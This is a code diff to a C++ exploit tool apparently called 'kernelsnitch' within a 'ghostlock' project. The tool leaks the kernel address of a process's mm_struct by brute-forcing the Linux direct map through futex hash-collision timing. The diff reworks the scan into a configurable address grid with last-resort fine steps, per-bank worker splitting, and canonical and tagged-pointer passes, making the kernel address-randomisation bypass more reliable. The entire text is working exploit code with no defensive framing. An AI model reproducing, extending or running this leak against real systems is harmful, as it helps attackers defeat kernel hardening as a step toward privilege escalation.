@@ -4,6 +4,8 @@
 #include "timeutils.h"
 #include "futex_hash.h"
 #include "scan_bounds.h"
+#include "scan_grid.h"
+#include "kernel/constants.hpp"
 #include "kernel/target.h"
 
 #include <algorithm>
@@ -77,8 +79,11 @@ namespace ghostlock::kernelsnitch {
     };
 
     struct kernelsnitch_shared_state {
-        volatile size_t mm_struct_sz;
-        volatile size_t mm_slab_order;
+        /* The leak's address grid: inner candidate step and outer slab step
+         * order (0 = 4 KiB). The profile's mm_struct_sz feeds spray sizing
+         * only; it is not these fields. */
+        volatile size_t scan_inner;
+        volatile size_t scan_outer_order;
         volatile size_t verbose;
 
         size_t collisions;
@@ -215,7 +220,13 @@ namespace ghostlock::kernelsnitch {
 
     struct mm_leak_arg {
         struct kernelsnitch_shared_state *ks;
-        struct range range;
+        /* Read-only, shared by all workers for the duration of the pass. */
+        struct range *ranges;
+        size_t range_count;
+        size_t worker_id;
+        size_t worker_count;
+        size_t inner;
+        size_t outer;
         int32_t try_canonical;
         int32_t sweep_tags;
     };
@@ -237,43 +248,55 @@ namespace ghostlock::kernelsnitch {
     }
 
     static void *__mm_leak(void *arg) {
-        struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(arg);
+        auto *mm_leak_arg = static_cast<struct mm_leak_arg *>(arg);
         struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
-        struct range *range = &mm_leak_arg->range;
-        if (ks->verbose)
-            pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start,
-                    range->end);
-        /* Keep the shift in size_t: PAGE_SIZE is an int macro, so the old
-         * expression converted a signed result (the only -Wsign-conversion
-         * warning in the build). MM_ORDER is small; the value is unchanged. */
-        const size_t mm_slab_sz =
-                static_cast<size_t>(PAGE_SIZE) << ks->mm_slab_order;
-        for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
-            if ((coarse_addr % (1ULL << 40)) == 0)
-                if (ks->verbose)
-                    pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr,
-                            coarse_addr + (1ULL << 40));
-            size_t slab_end = ghostlock::kernelsnitch::scan_limit(coarse_addr, COARSE_SZ, range->end);
-            for (size_t slab_addr = coarse_addr; (slab_addr < slab_end) && !ks->found; slab_addr += mm_slab_sz) {
-                size_t slab_limit = ghostlock::kernelsnitch::scan_limit(slab_addr, mm_slab_sz, slab_end);
-                for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found;
-                     mm_struct_candidate += ks->mm_struct_sz) {
-                    if (mm_leak_arg->try_canonical) {
-                        size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
-                        if (__mm_candidate_matches(ks, canonical_candidate)) {
-                            __mm_mark_found(ks, canonical_candidate);
-                            break;
-                        }
-                    }
-
-                    if (mm_leak_arg->sweep_tags) {
-                        for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found; ++tag_candidate) {
-                            if (tag_candidate == 15)
-                                continue;
-                            size_t tagged_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (tag_candidate << 56);
-                            if (__mm_candidate_matches(ks, tagged_candidate)) {
-                                __mm_mark_found(ks, tagged_candidate);
+        for (size_t index = mm_leak_arg->worker_id;
+             index < mm_leak_arg->range_count && !ks->found;
+             index += mm_leak_arg->worker_count) {
+            struct range *range = &mm_leak_arg->ranges[index];
+            if (ks->verbose)
+                pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx] step=%zu outer=%zu\n",
+                        range->id, range->start, range->end, mm_leak_arg->inner,
+                        mm_leak_arg->outer);
+            const size_t mm_slab_sz = mm_leak_arg->outer;
+            for (size_t coarse_addr = range->start;
+                 (coarse_addr < range->end) && !ks->found;
+                 coarse_addr += COARSE_SZ) {
+                if ((coarse_addr % (1ULL << 40)) == 0)
+                    if (ks->verbose)
+                        pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr,
+                                coarse_addr + (1ULL << 40));
+                size_t slab_end =
+                        ghostlock::kernelsnitch::scan_limit(coarse_addr, COARSE_SZ, range->end);
+                for (size_t slab_addr = coarse_addr;
+                     (slab_addr < slab_end) && !ks->found;
+                     slab_addr += mm_slab_sz) {
+                    size_t slab_limit =
+                            ghostlock::kernelsnitch::scan_limit(slab_addr, mm_slab_sz, slab_end);
+                    for (size_t mm_struct_candidate = slab_addr;
+                         (mm_struct_candidate < slab_limit) && !ks->found;
+                         mm_struct_candidate += mm_leak_arg->inner) {
+                        if (mm_leak_arg->try_canonical) {
+                            size_t canonical_candidate =
+                                    (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
+                            if (__mm_candidate_matches(ks, canonical_candidate)) {
+                                __mm_mark_found(ks, canonical_candidate);
                                 break;
+                            }
+                        }
+
+                        if (mm_leak_arg->sweep_tags) {
+                            for (size_t tag_candidate = 0; tag_candidate < 16 && !ks->found;
+                                 ++tag_candidate) {
+                                if (tag_candidate == 15)
+                                    continue;
+                                size_t tagged_candidate =
+                                        (mm_struct_candidate & ~(0xfULL << 56)) |
+                                        (tag_candidate << 56);
+                                if (__mm_candidate_matches(ks, tagged_candidate)) {
+                                    __mm_mark_found(ks, tagged_candidate);
+                                    break;
+                                }
                             }
                         }
                     }
@@ -284,26 +307,78 @@ namespace ghostlock::kernelsnitch {
         return 0;
     }
 
-    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical, int32_t sweep_tags) {
+    static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int32_t try_canonical,
+                                   int32_t sweep_tags, size_t inner, size_t outer) {
         /* the leak check discards a match past the measured end, so no slice
      * scans past it */
-        const size_t ceiling = std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
-                                                  static_cast<uint64_t>(IDENTITY_END));
+        const size_t ceiling = static_cast<size_t>(
+                std::min<uint64_t>(ghostlock::kernel::g_direct_map_end,
+                                   static_cast<uint64_t>(IDENTITY_END)));
+        struct range ranges[ghostlock::kernel::MAX_DIRECT_MAP_BANKS + 64];
+        size_t range_count = 0;
+        const char *source = "span";
+        if (ghostlock::kernel::g_direct_map_bank_count > 0) {
+            source = "banks";
+            for (size_t i = 0;
+                 i < ghostlock::kernel::g_direct_map_bank_count &&
+                 range_count < ghostlock::kernel::MAX_DIRECT_MAP_BANKS;
+                 ++i) {
+                const size_t start = static_cast<size_t>(std::max<uint64_t>(
+                        ghostlock::kernel::g_direct_map_banks[i].start, IDENTITY_START));
+                const size_t end = static_cast<size_t>(
+                        std::min<uint64_t>(ghostlock::kernel::g_direct_map_banks[i].end,
+                                           ceiling));
+                if (start < end) {
+                    ranges[range_count].id = range_count;
+                    ranges[range_count].start = start;
+                    ranges[range_count].end = end;
+                    ++range_count;
+                }
+            }
+            if (range_count == 0)
+                source = "span";
+        }
+        if (range_count == 0) {
+            /* No usable bank list: split the measured span across the workers.
+             * identity_diff is no longer used by the scan; the split is local. */
+            const size_t span = ceiling > IDENTITY_START ? ceiling - IDENTITY_START : 0;
+            const size_t diff = span / (ks->thread_cnt ? ks->thread_cnt : 1);
+            for (size_t i = 0; i < ks->thread_cnt; ++i) {
+                size_t start = IDENTITY_START + diff * i;
+                size_t end = (i + 1 == ks->thread_cnt)
+                                     ? ceiling
+                                     : IDENTITY_START + diff * (i + 1);
+                if ((start % COARSE_SZ) != 0)
+                    start = (start & ~(COARSE_SZ - 1));
+                if ((end % COARSE_SZ) != 0)
+                    end = ((end & ~(COARSE_SZ - 1)) + COARSE_SZ);
+                if (end > ceiling)
+                    end = ceiling;
+                if (start < end) {
+                    ranges[range_count].id = range_count;
+                    ranges[range_count].start = start;
+                    ranges[range_count].end = end;
+                    ++range_count;
+                }
+            }
+        }
+        pr_info("[kernelsnitch] scan inner=%zu outer=%zu ranges=%zu source=%s "
+                "canonical=%d tags=%d\n",
+                inner, outer, range_count, source, try_canonical, sweep_tags);
+        if (ks->thread_cnt == 0)
+            return;
         for (size_t i = 0; i < ks->thread_cnt; ++i) {
             struct mm_leak_arg *mm_leak_arg = static_cast<struct mm_leak_arg *>(SYSCHK(
                 calloc(1, sizeof(struct mm_leak_arg))));
             mm_leak_arg->ks = ks; // NOLINT(clang-analyzer-nullability.NullableDereferenced)
-            mm_leak_arg->range.id = i;
-            mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff * i;
-            mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff * (i + 1);
+            mm_leak_arg->ranges = ranges;
+            mm_leak_arg->range_count = range_count;
+            mm_leak_arg->worker_id = i;
+            mm_leak_arg->worker_count = ks->thread_cnt;
+            mm_leak_arg->inner = inner;
+            mm_leak_arg->outer = outer;
             mm_leak_arg->try_canonical = try_canonical;
             mm_leak_arg->sweep_tags = sweep_tags;
-            if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
-                mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
-            if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
-                mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
-            if (mm_leak_arg->range.end > ceiling)
-                mm_leak_arg->range.end = ceiling;
             SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
         }
         for (size_t i = 0; i < ks->thread_cnt; ++i)
@@ -316,16 +391,16 @@ namespace ghostlock::kernelsnitch {
 
     /**
  * Setup phase of KernelSnitch
- * @arg __mm_struct_sz: sizeof(mm_struct) needed for the bruteforcing phase
- * @arg __mm_slab_order: the order of the mm_struct slab
+ * @arg scan_inner: address-grid step for the leak (32 primary, 8 last resort)
+ * @arg scan_outer_order: outer slab-grid order (0 = 4 KiB; removes the order-3 assumption)
  * @arg __thread_cnt: thread count used for the bruteforcing phase
  * @arg __collision_cnt: collision count to then try to correlate the mm_struct address to the user addresses
  * @arg __verbose: amount of print info, 1 enables and 0 disables
  * @arg __pin_cpu: CPU the calling thread is pinned to for the search
  * @return shared KernelSnitch state
  */
-    KernelSnitchContext *context_init(size_t __mm_struct_sz,
-                                      size_t __mm_slab_order,
+    KernelSnitchContext *context_init(size_t scan_inner,
+                                      size_t scan_outer_order,
                                       size_t __thread_cnt,
                                       size_t __collision_cnt,
                                       size_t __verbose,
@@ -335,8 +410,8 @@ namespace ghostlock::kernelsnitch {
             MAP_ANON | MAP_SHARED, -1, 0)));
         ks->mm_struct = static_cast<size_t>(-1);
         ks->scan_done = 0;
-        ks->mm_struct_sz = __mm_struct_sz;
-        ks->mm_slab_order = __mm_slab_order;
+        ks->scan_inner = scan_inner;
+        ks->scan_outer_order = scan_outer_order;
         size_t online_cpu_cnt = static_cast<size_t>(SYSCHK(sysconf(_SC_NPROCESSORS_ONLN)));
         /* The kernel table follows the possible CPUs, not the online subset. */
         size_t possible_cpu_cnt = static_cast<size_t>(sysconf(_SC_NPROCESSORS_CONF));
@@ -374,12 +449,12 @@ namespace ghostlock::kernelsnitch {
 
         if (ks->verbose)
             pr_info(
-                "parameters cpu (%zu online, %zu possible, futex table %zu) mm_struct sz (%zx) mm slab order (%zu) thread cnt (%zu) collisions (%zu)\n",
+                "parameters cpu (%zu online, %zu possible, futex table %zu) scan inner (%zx) scan outer order (%zu) thread cnt (%zu) collisions (%zu)\n",
                 ks->cpu_cnt,
                 possible_cpu_cnt,
                 ks->futex_hash_table_size,
-                ks->mm_struct_sz,
-                ks->mm_slab_order,
+                ks->scan_inner,
+                ks->scan_outer_order,
                 ks->thread_cnt,
                 ks->collisions);
         ghostlock::kernel::pin_to_core(__pin_cpu);
@@ -634,9 +709,18 @@ namespace ghostlock::kernelsnitch {
         if (ks->verbose) pr_info("start bruteforcing\n");
         ghostlock::kernel::reset_cpu_pin();
 
-        __run_mm_leak_pass(ks, 1, 0);
+        /* Primary grid: 32 divides every observed family stride (960..1280),
+         * so it reaches every object position; the 4 KiB outer step removes
+         * the slab-order assumption. S=8 is the universal last resort for a
+         * stride that is not a multiple of 32. */
+        __run_mm_leak_pass(ks, 1, 0, SCAN_PRIMARY_INNER, SCAN_OUTER);
         if (!ks->found)
-            __run_mm_leak_pass(ks, 0, 1);
+            __run_mm_leak_pass(ks, 0, 1, SCAN_PRIMARY_INNER, SCAN_OUTER);
+        if (!ks->found) {
+            __run_mm_leak_pass(ks, 1, 0, SCAN_LAST_RESORT_INNER, SCAN_OUTER);
+            if (!ks->found)
+                __run_mm_leak_pass(ks, 0, 1, SCAN_LAST_RESORT_INNER, SCAN_OUTER);
+        }
         ks->state = (ks->mm_struct == static_cast<size_t>(-1)) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
         return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
     }
@@ -719,14 +803,14 @@ namespace ghostlock::kernelsnitch {
             return *this;
         }
 
-        [[nodiscard]] static KernelSnitchOwner create(size_t mm_struct_sz,
-                                                      size_t mm_slab_order,
+        [[nodiscard]] static KernelSnitchOwner create(size_t scan_inner,
+                                                      size_t scan_outer_order,
                                                       size_t thread_cnt,
                                                       size_t collision_cnt,
                                                       size_t verbose,
                                                       size_t pin_cpu) noexcept {
             return KernelSnitchOwner(kernelsnitch::context_init(
-                mm_struct_sz, mm_slab_order, thread_cnt, collision_cnt, verbose,
+                scan_inner, scan_outer_order, thread_cnt, collision_cnt, verbose,
                 pin_cpu));
         }
 
